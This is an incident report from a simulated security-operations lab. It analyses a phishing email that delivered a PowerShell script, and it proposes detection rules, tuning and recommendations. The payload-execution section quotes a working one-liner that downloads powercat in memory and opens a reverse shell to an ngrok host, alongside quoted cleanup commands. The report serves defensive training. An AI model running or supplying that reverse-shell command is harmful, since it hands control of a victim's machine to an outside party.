## 1.Executive Summary
This report provides analysis of a phishing cyber-attack in a simulated Security Operations center(SOC) environment. The attack was done through a malicious email that appeared to be from a legitimate internal account, making it more credible for user interaction. The email contained a PowerShell script attachment named "forceupdate.ps1" which was presented as a legitimate update.
The script was executed at least one system, leading to malicious activity like remote code execution, command and control communication and defense evasion techniques.The first compromised system was host"win-3450" which showed multiple signs of compromise: PowerShell executions and external communication with ngrok to an external tunneling service.
There was some activity on another system "win-3459". A phishing attempt was done with the same phishing email, but there was no sign of the system being fully compromised. This mean that the phishing campaign was targeting multiple users.
The severity of this incident can be classified as "HIGH" due to the remote access, attacker persistence and potential data exfiltration.

## 2. Attack Breakdown

### A. Initial Access

The attack began with a phishing email sent to multiple targets, which appeared to be a legitimate internal user account(yani.zubair@tryhatme.com). The email contained an attachment named "forceupdate.ps1" and instructed the user to execute the script as part of an update.

Indicators of malicious intent:
- Use of PowerShell script attachment, usually uncommon in legitimate business
- Informal language and rush of the target to execute the update
- potential compromise of  the IT support account

This type of attack is a spear-phishing or internal phishing attack, where the malicious agent try to gain trust of the victim, to increase success.
### B. User Interaction
	Multiple users interacted with the phishing email. From the evidence gathered we discovered system "win-3459" and "win-3450" were 2 of the targets:
- host "win-3459" accessed the email via Outlook, but there were no signs of downloading and executing the script.
- host "win-3450" on the other side downloaded the malicious script to the Downloads directory

This shows that the phishing campaign targeted multiple users, but just one system was compromised as a result of execution of the malicious script.

### C. Payload Execution

The compromised host(win-3450) executed a PowerShell command:
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
This command downloads and executes remote code directly in the memory, avoiding file-based detection mechanisms. The payload included the use of "powercat", a tool that is commonly used to establish reverse shell connections.
This activity is a very strong sign of malicious behaviour and is commonly associated with attacker frameworks and post-exploitation techniques.

### D. Post-Compromise Activity
After execution, the attacker established a reversed shell connection to an external domain using ngrok. This allowed remote command execution and full control over the compromised system.

Other activities of the compromised system noticed:
- continued PowerShell execution indicating active attacker control
- execution of cleanup commands:
	- C:\Windows\system32\net.exe use Z: /delete:
		- This command was executed via PowerShell, indicating removal of a mapped network drive. In normal situation, wouldn't be a flag, but in the context given, this behavior is consistent with attacker cleanup or disruption of network connections.
	- C:\Windows\system32\rundll32.exe C:\Windows\system32\inetcpl.cpl,ClearMyTracksByProcess
- potential staging files for exfiltration
	- C:\Users\michael.ascot\downloads\exfiltration\

These behavior enforces an advanced stage of system "win-3450" being compromised using command-and-control and defense evasion.

### 3. Detection Opportunities

- ***Suspicious Internal Email Behavior***
	Internal users rarely send executable scripts. Monitoring such behavior can detect compromised accounts or insider threats
- ***Script File Creation in User Directories***
	Creation of ".ps1" files in directories like Downloads is suspicious and often linked to phishing attacks.
- ***PowerShell Remote Code Execution***
	Use of DownloadString is well-known for fileless malware execution and should be closely monitored.
- ***External Communication to Tunneling Services***
	Using services like ngrok is very unusual in enterprise environments and often is connected with malicious activity.
- ***Defense Evasion Activity*** 
	Using Commands like ClearMyTracksByProcess shows attempts to remove evidence and should be flagged.

### 4.Detection Rules 

***Rule 1***:
Detection Name: PowerShell Remote Script Execution
***Logic***:
IF PowerShell executes DownloadString from an external URL
THEN trigger alert
***Data Source***:
Endpoint logs(Sysmon, SIEM)

***Rule 2:***
Detection Name: Suspicious External Tunnel Communication
***Logic:***
IF outbound traffic to known tunneling domains such as ngrok
THEN trigger alert
***Data Source:***
DNS logs, firewall logs

***Rule 3:***
Detection Name: Script Execution from Downloads Directory
***Logic***:
IF a .ps1 is executed from a user Downloads folder
THEN trigger alert
***Data Source:***
Endpoint monitoring logs

***Rule 4:***
Detection Name: Executable Download from Internet
***Logic:***
IF a file with extension(.exe, .ps1, .bat, .dll)
is downloaded from an external source (HTTP/HTTPS)
AND shortly after is executed on the system
THEN trigger HIGH severity alert
***Data Source:***
Endpoint monitoring logs
Browser download logs
Proxy/Web logs

### 5.SOC Workflow integration

When a detection rule is triggered, a Tier 1 SOC analyst will review the alert details, process execution, command-line arguments and user context, then will decide whether there is a malicious behavior.

If suspicious activity is confirmed, such as external connections or PowerShell commands like in our case, the alert is escalated to Tier 2 analysts.

Tier 2 analysts will perform deeper investigation, including forensic analysis, system isolation and threat hunting across other hosts and determine the scope of compromise.

### 6. False Positives & Tuning

There can occur plenty of false positives as in our case, where there were a lot of non-malicious administrative activities. Systems need to be maintained and secured, so there can be tunneling tools and other remote connections. These alerts can be reduced by:
- Whitelisting trusted users and systems(not the best practice, because sometimes those users can be compromised as well, but combined with other practices it could be beneficial) 
	- having trusted users and systems will trigger less alerts, because they will be recognized as internal or allowed inside the organization.
- Filtering known safe domains 
	- Having a list with safe domains will reduce the triggers because those domains were pre-checked before added
- Establishing baseline procedures so it would be easier to be recognized 
	- Having a pattern of conduit when fixing a system or doing some less often activities will reduce the false positives because they follow the rules implied.

### 7.Detection Gaps

Despite detection capabilities, there still some gaps that can't be detected:
- Encrypted traffic may hide malicious communications 
	- ngrok (HTTPS tunnel)
	- communication is encrypted, so you cannot see the actual commands and data exfiltrated
	- Tools needed:
		- SSL inspection(proxy decryption
		- DNS monitoring and domain reputation
	
- Limited email analysis reduces visibility into phishing indicators
	- emails looked internal and legitimate(no full email headers or attachment scanning)
	- Tools needed:
		- email gateways logs
		- attachment sandboxing
		- email threat detection tools 
- Lack of user behavior analytics make suspicious detection difficult
	- user downloaded the script
	- executed PowerShell
	- system compromised
	- in our case, if there were any conduits about how to fix a system, there would have been a trigger alert
	- Tools Needed:
		- User Behavior Analytics
		- anomaly detection systems
- Limited correlation across systems
	- multiple systems received the email
	- only one executed the payload
	- Tools Needed
		- SIEM correlation rules
		- cross-host analysis

### 8.Recommendations

***Immediate Improvements*** (0-3 days):
 - Isolate compromised host(win-3450)
 - Disable or investigate internal sender account
 - Block ngrok domains
 - 
***Short-Term Improvements***(0-21 days)
 - Enable PowerShell logging
 - Implement email filtering rules for script attachments
 - Conduct user awareness training
***Long-Term Improvements***(3-6 months)
- Deploy endpoint detection and response
- Implement SIEM correlation rules
- Conduct phishing simulation exercises

### 9.Reflection

This analysis was a special case where the phishing came or looked to be coming from the inside. It was challenging to determine what was True Positive and False Positive because there were no specific rules about the conduit of the company and the layout of the security. In my case, I need to have a pre-defined system environment conduit and action rule because you have a starting point. Small companies may have less rules when it comes to what dns servers can be accessed or firewall rules or even a system at all where some basic rules are pre-defined. 
Detection design is a must for any company that is conducting business online(connected to the internet more exactly) because it makes it easier for SOC to triage alerts. 
What I would improve in this scenario is to have a template about the conduit of the company, user access, trusted dns servers and better email detection filters.
Phishing knowledge is very important for all employees to have, because it happens in corporate and personal environments as well and prevention costs less than fixing. Training,strict environment rules and user accessibility are a must for every company nowadays to survive. It is easier to bypass security with phishing than to try to break firewalls, passwords and other security rules, because people remain the most vulnerable asset in the company.

### Conclusion

This phishing attack demonstrates how trusted internal communication can be exploited to deliver malicious payloads. By improving detection strategies and monitoring key indicators, organizations can better defend against similar threats.